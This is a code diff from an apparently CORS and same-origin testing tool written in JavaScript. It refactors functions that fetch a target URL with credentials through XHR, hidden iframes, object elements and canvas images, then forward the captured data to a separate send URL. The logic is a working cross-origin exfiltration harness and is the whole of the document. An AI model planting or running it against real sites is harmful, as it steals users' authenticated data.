@@ -220,12 +220,21 @@ function logToConsole(msg) {
 
 function getData(baseReqURL, baseSendURL, callback, exfMethods) {
 	var currOrigin = getCurrOrigin();
-	function genReqSendURLs(origin, creds, method, via) {
+	function genReqSendURLs(origin, creds, methods, via) {
 		var creds = (creds ? '1' : '0');
 		if (baseReqURL.split('?').length > 1) { var reqSep = '&'; }
 		else { reqSep = '?'; }
 		if (baseSendURL.split('?').length > 1) { var sendSep = '&'; }
 		else { sendSep = '?'; }
+
+		var httpM = methods['http'];
+		for (var prop in methods) {
+			if (methods.hasOwnProperty(prop)) {
+				if (prop !== 'http') {
+					via += methods[prop];
+				}
+			}
+		}
 		return {
 			req: baseReqURL + reqSep +
 				'origin=' + encodeURIComponent(origin) +
@@ -235,20 +244,24 @@ function getData(baseReqURL, baseSendURL, callback, exfMethods) {
 			send: baseSendURL + sendSep +
 				'allowOrigin=' + encodeURIComponent(origin) +
 				'&allowCreds=' + creds +
-				'&method=' + method +
+				'&method=' + httpM +
 				'&via=' + via
 			};
 	};
 
 	if (! exfMethods) {
-		exfMethods = [ 'XHR', 'Iframe', 'Object', '2DCanvas', 'BitmapCanvas' ];
+		exfMethods = [ 'XHR', 'Iframe', 'Object', 'Canvas' ];
 	}
 	reqMethods = {
-		'XHR': ['GET', 'POST'],
-		'Iframe': ['GET'],
-		'Object': ['GET'],
-		'2DCanvas': ['GET'],
-		'BitmapCanvas': ['GET']
+		'XHR': [{http: 'GET'}, {http: 'POST'}],
+		'Iframe': [{http: 'GET'}],
+		'Object': [{http: 'GET'}],
+		'Canvas': [
+			{http: 'GET', ctx: '2D', cors: ''},
+			{http: 'GET', ctx: '2D', cors: 'CORS'},
+			{http: 'GET', ctx: 'Bitmap', cors: ''},
+			{http: 'GET', ctx: 'Bitmap', cors: 'CORS'}
+		]
 	};
 	corsCombos = [
 		{ origin: currOrigin, creds: 1 },
@@ -278,7 +291,7 @@ function getData(baseReqURL, baseSendURL, callback, exfMethods) {
 				urls = genReqSendURLs(corsC['origin'], corsC['creds'], reqM, exfM);
 				func = window['getDataVia' + exfM];
 				try {
-					func(urls['req'], (reqM === 'POST'), urls['send'], callbackWrapper);
+					func(urls['req'], reqM, urls['send'], callbackWrapper);
 				} catch(err) {
 					window.requestsLeft--;
 					//logToPage('error during getData*: ' + window.requestsLeft + ' to go'); //DEBUG
@@ -317,15 +330,22 @@ function getTryHandlerWrapper (handler, onerror, ondone) {
 	};
 };
 
-function getDataViaXHR(reqURL, reqViaPOST, sendURL, callback) {
+function getDataViaXHR(reqURL, methods, sendURL, callback) {
 	var logId = 'log_' + rand(); // unique log ID for each request
+	var doPOST = false;
+	if (methods['http'] === 'POST') { doPOST = true; }
+	else if (methods['http'] !== 'GET') {
+		logToPage('Unsupported method: ' + methods['http'], null, null, logId);
+		return;
+	}
+
 	var req = new XMLHttpRequest();
 	var readyState = 0;
 	var callbackWrapper = function () {
 		if (readyState != 4) { return; }
 		if (callback) { callback(data); }
 	};
-	if (reqViaPOST) {
+	if (doPOST) {
 		logToPage('POSTing to ' + reqURL, null, null, logId);
 		req.open('POST', reqURL);
 		req.setRequestHeader('Content-Type',
@@ -343,14 +363,14 @@ function getDataViaXHR(reqURL, reqViaPOST, sendURL, callback) {
 		logToPage(data, CSS['red'], null, logId);
 		sendData(data, this.getResponseHeader('content-type'), sendURL);
 	}, null, callbackWrapper);
-	if (reqViaPOST) {
+	if (doPOST) {
 		req.send("{}"); // Opera 8.5 doesn't support JSON
 	} else {
 		req.send();
 	}
 };
 
-function getDataViaIframe(reqURL, reqViaPOST, sendURL, callback) {
+function getDataViaIframe(reqURL, methods, sendURL, callback) {
 	var logId = 'log_' + rand(); // unique log ID for each request
 	logToPage('Embedding in an iframe ' + reqURL, null, null, logId);
 	var data = null;
@@ -368,7 +388,7 @@ function getDataViaIframe(reqURL, reqViaPOST, sendURL, callback) {
 		null, func, callbackWrapper);
 };
 
-function getDataViaObject(reqURL, reqViaPOST, sendURL, callback) {
+function getDataViaObject(reqURL, methods, sendURL, callback) {
 	var logId = 'log_' + rand(); // unique log ID for each request
 	logToPage('Embedding in an object ' + reqURL, null, null, logId);
 	var data = null;
@@ -390,66 +410,74 @@ function getDataViaObject(reqURL, reqViaPOST, sendURL, callback) {
 		}, null, callbackWrapper);
 		setTimeout(sendDataLater, 2000);
 	};
-	// don't think crossorigin is used for object, but meh
-	var obj = addElement('object', {crossorigin: 'use-credentials',
-		data: reqURL, type: 'text/plain', style: CSS['hidden']},
+	var obj = addElement('object', {data: reqURL, type: 'text/plain', style: CSS['hidden']},
 		null, func, callbackWrapper);
 };
 
-function getDataVia2DCanvas(reqURL, reqViaPOST, sendURL, callback) {
+function getDataViaCanvas(reqURL, methods, sendURL, callback) {
+	// methods.ctx should be '2d' or 'bitmap', methods.cors is a boolean
+	var useXOrigin = Boolean(methods['cors']);
+	var canvasCtx = methods['ctx'] || '2d';
+	canvasCtx = canvasCtx.toLowerCase();
+	if (canvasCtx !== '2d' && canvasCtx !== 'bitmap') {
+		logToPage('Unsupported canvas context ' + canvasCtx, null, null, logId);
+	}
+
 	var logId = 'log_' + rand(); // unique log ID for each request
-	logToPage('Embedding in a 2D canvas ' + reqURL, null, null, logId);
+	var renderers = {};
+	if (useXOrigin) {
+		logToPage('Embedding in a ' + canvasCtx + ' canvas (with crossorigin) ' + reqURL, null, null, logId);
+	} else {
+		logToPage('Embedding in a ' + canvasCtx + ' canvas ' + reqURL, null, null, logId);
+	}
+
 	var data = null;
 	var callbackWrapper = function () {
 		if (callback) { callback(data); }
 	};
-	var func = function () {
+
+	var exportCanvas = function() {
+		var dataParts = /^data:([^;,]+)(;base64)?,(.*)/.exec(this.toDataURL());
+		var ctype = dataParts[1];
+		var alreadyEncoded = Boolean(dataParts[2]);
+		data = dataParts[3];
+		logToPage(data, CSS['red'], null, logId);
+		sendData(data, ctype, sendURL, alreadyEncoded);
+	};
+
+	renderers['2d'] = function () {
 		//DEBUG if (this == window){logToPage('this is window', CSS['red'], null, logId);return}
-		// the onload handler of <img> fires too soon in IE9 so we call it from setTimeout
+		// the onload handler of <img> fires too soon in IE9 so we call it from
+		// setTimeout
 		// old browsers support neither .bind, nor lambda functions so we use closure
 		var currThis = this;
 		var sendDataLater = getTryHandlerWrapper(function () {
 			var can = document.createElement('canvas');
 			var ctx = can.getContext('2d');
 			ctx.drawImage(currThis, 0, 0);
-			var dataParts = /^data:([^;,]+)(;base64)?,(.*)/.exec(can.toDataURL());
-			var ctype = dataParts[1];
-			var alreadyEncoded = Boolean(dataParts[2]);
-			data = dataParts[3];
-			logToPage(data, CSS['red'], null, logId);
-			sendData(data, ctype, sendURL, alreadyEncoded);
+			exportCanvas.call(can);
 		}, null, callbackWrapper);
 		setTimeout(sendDataLater, 1000);
 	};
-	var img = addElement('img', {crossorigin: 'use-credentials',
-		src: reqURL, style: CSS['hidden']}, null, func, callbackWrapper);
-};
-
-function getDataViaBitmapCanvas(reqURL, reqViaPOST, sendURL, callback) {
-	var logId = 'log_' + rand(); // unique log ID for each request
-	logToPage('Embedding in a bitmap canvas ' + reqURL, null, null, logId);
-	var data = null;
-	var callbackWrapper = function () {
-		if (callback) { callback(data); }
-	};
-	var func = getTryHandlerWrapper(function () {
+	renderers['bitmap'] = getTryHandlerWrapper(function () {
 		//DEBUG if (this == window){logToPage('this is window', CSS['red'], null, logId);return}
 		createImageBitmap(this, 0, 0, 100, 100).then(function(bmap) {
 			var can = document.createElement('canvas');
 			var ctx = can.getContext('bitmaprenderer');
 			ctx.transferFromImageBitmap(bmap);
-			var dataParts = /^data:([^;,]+)(;base64)?,(.*)/.exec(can.toDataURL());
-			var ctype = dataParts[1];
-			var alreadyEncoded = Boolean(dataParts[2]);
-			data = dataParts[3];
-			logToPage(data, CSS['red'], null, logId);
-			sendData(data, ctype, sendURL, alreadyEncoded);
+			exportCanvas.call(can);
 		}, function(err) {
 			throw err; // let the surrounding code handle this
 		});
 	}, null, callbackWrapper);
-	var img = addElement('img', {crossorigin: 'use-credentials',
-		src: reqURL, style: CSS['hidden']}, null, func, callbackWrapper);
+
+	if (useXOrigin) {
+		var img = addElement('img', {crossorigin: 'use-credentials',
+			src: reqURL, style: CSS['hidden']}, null, renderers[canvasCtx], callbackWrapper);
+	} else {
+		var img = addElement('img', {
+			src: reqURL, style: CSS['hidden']}, null, renderers[canvasCtx], callbackWrapper);
+	}
 };
 
 function sendData(data, ctype, sendURL, alreadyEncoded) {
